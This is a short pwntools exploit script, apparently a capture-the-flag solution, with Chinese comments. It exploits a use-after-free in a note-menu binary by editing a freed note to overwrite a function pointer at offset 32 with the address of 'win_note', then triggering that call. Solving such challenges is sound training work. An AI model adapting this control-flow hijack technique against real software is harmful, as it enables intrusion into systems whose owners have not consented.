#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9110'))

context(arch='amd64', os='linux', log_level='info')

elf = ELF(os.path.join(HERE, '..', 'files', 'pwn'))
win_note = elf.symbols['win_note']
log.info('win_note = %#x', win_note)


def menu(p):
    p.recvuntil(b'> ')


p = remote(HOST, PORT)
menu(p)
p.sendline(b'1')                      # new
p.recvuntil(b'data: ')
p.sendline(b'hello')

menu(p)
p.sendline(b'3')                      # free(notes[0])，槽位不清空
p.recvuntil(b'idx: ')
p.sendline(b'0')
p.recvuntil(b'freed')

menu(p)
p.sendline(b'2')                      # edit 走悬空指针：UAF 写
p.recvuntil(b'idx: ')
p.sendline(b'0')
p.recvuntil(b'data: ')
# struct note { char data[32]; void (*func)(char *); } -> func 在偏移 32
p.send(b'A' * 32 + p64(win_note))
time.sleep(0.2)
p.recvuntil(b'edited')

menu(p)
p.sendline(b'4')                      # run -> 调用被改写的 func
p.recvuntil(b'idx: ')
p.sendline(b'0')
print(p.recvall(timeout=3).decode(errors='replace'))
